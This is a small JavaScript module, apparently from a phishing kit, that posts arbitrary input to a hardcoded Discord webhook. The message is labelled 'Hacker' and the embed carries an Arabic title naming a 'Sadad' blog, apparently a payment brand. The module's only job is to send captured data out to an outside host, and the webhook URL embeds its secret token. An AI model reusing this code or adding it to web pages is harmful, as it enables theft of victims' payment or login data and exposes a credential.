import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325446507259760660/7JUg934niH4XB07BpMzdX52mG9nFJZW0DbdcZXeh18grok79R8x4n7022KmXm6HAeQTm",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
